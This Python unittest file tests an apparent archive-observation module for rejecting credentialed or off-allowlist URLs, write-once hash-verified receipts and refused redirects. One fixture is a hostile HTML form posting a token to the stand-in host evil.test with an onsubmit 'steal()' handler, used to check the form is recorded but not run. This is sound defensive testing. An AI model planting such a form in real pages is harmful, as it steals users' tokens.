import importlib.util
from pathlib import Path
import json
import tempfile
import unittest

MODULE = Path(__file__).resolve().parents[1] / 'host' / 'observe.py'
spec = importlib.util.spec_from_file_location('wayback_adapter', MODULE)
a = importlib.util.module_from_spec(spec)
spec.loader.exec_module(a)


class AuditTests(unittest.TestCase):
    def test_synthetic(self):
        b = b'<title>A</title><meta name="keywords" content="secret"><a href="/telas/Produtos.asp?Grupo=A">a</a>'
        o = a.observe_bytes('synthetic://local', b, {'status': 200}, '2026-11-01T00:00:00Z')
        self.assertEqual(o['raw_body_sha256'], a.sha(b))
        self.assertEqual(o['html_indicators']['link_count'], 1)
        self.assertNotIn('secret', json.dumps(o))
        self.assertNotIn('/telas/Produtos.asp', json.dumps(o))
        self.assertEqual(o['html_indicators']['link_shapes'][0].count('Grupo'), 1)

    def test_no_credentials(self):
        with self.assertRaises(ValueError):
            a.safe_url('https://secret:password@reisoffice.com.br/')

    def test_external_host(self):
        for url in ['https://127.0.0.1/', 'http://www.cesarreis.com.br/',
                    'https://localhost/', 'https://www.geocities.ws/other/',
                    'https://web.archive.org/cdx/search/cdx',
                    'https://reisoffice.com.br/?id=token']:
            with self.subTest(url=url):
                with self.assertRaises(ValueError):
                    a.safe_url(url)

    def test_four_allowlisted(self):
        for url in a.CANDIDATE_URLS:
            self.assertIsNotNone(a.safe_url(url))

    def test_nonoverwrite(self):
        with tempfile.TemporaryDirectory() as d:
            out = Path(d)/'run1'
            record = {'x': 1}
            h = a.write_receipt_once(out, record)
            self.assertEqual(h, a.sha(a.canon(record) + b'\n'))
            with self.assertRaises(FileExistsError):
                a.write_receipt_once(out, record)

    def test_previous_reconstruction(self):
        with tempfile.TemporaryDirectory() as d:
            out = Path(d)/'run1'
            source = a.sha(b'synthetic://local')
            record = {'schema': 'rafaelia.wayback.evidence.v1',
                      'observation': {'source_url_sha256': source, 'raw_body_sha256': a.sha(b'a')}}
            h = a.write_receipt_once(out, record)
            verified, body = a.verify_previous(out/'receipt.json', source)
            self.assertEqual(h, verified)
            self.assertEqual(body, a.sha(b'a'))

    def test_changed_previous_is_rejected(self):
        with tempfile.TemporaryDirectory() as d:
            out = Path(d)/'run1'
            source = a.sha(b'synthetic://local')
            record = {'schema': 'rafaelia.wayback.evidence.v1',
                      'observation': {'source_url_sha256': source}}
            a.write_receipt_once(out, record)
            with open(out/'receipt.json','ab') as f: f.write(b'corruption')
            with self.assertRaisesRegex(ValueError, 'HASH_MISMATCH'):
                a.verify_previous(out/'receipt.json', source)

    def test_wrong_source_refused(self):
        with tempfile.TemporaryDirectory() as d:
            out = Path(d)/'run1'
            a.write_receipt_once(out, {'schema':'rafaelia.wayback.evidence.v1',
                                       'observation':{'source_url_sha256':'abc'}})
            with self.assertRaisesRegex(ValueError, 'SOURCE_MISMATCH'):
                a.verify_previous(out/'receipt.json','xyz')

    def test_form_and_links_are_not_executed(self):
        doc = b'<form method="POST" action="https://evil.test/submit?token=raw" onsubmit="steal()"><img src="x.jpg"></form>'
        o = a.observe_bytes('synthetic://local',doc,{'status':200},'date')
        self.assertEqual(o['html_indicators']['forms'][0]['method_literal'],'POST')
        self.assertEqual(o['html_indicators']['onsubmit_count'],1)
        self.assertEqual(o['html_indicators']['img_count'],1)
        self.assertNotIn('evil.test',json.dumps(o))
        self.assertNotIn('steal()',json.dumps(o))
        self.assertNotIn('token=raw',json.dumps(o))

    def test_canonical_determinism(self):
        self.assertEqual(a.canon({'b':2, 'a':1}), a.canon({'a':1, 'b':2}))

    def test_no_timestamp_from_headers(self):
        o=a.observe_bytes('synthetic://local',b'ok',{'status':200,'last_modified_unverified':'1994'},'2026')
        self.assertEqual(o['http_last_modified_claim'],'1994')
        self.assertNotIn('created_at',o)

    def test_no_redirect_handler(self):
        self.assertIsNone(a.NoRedirect().redirect_request(None,None,302,'found',{},'https://evil.test'))

if __name__ == '__main__':
    unittest.main()
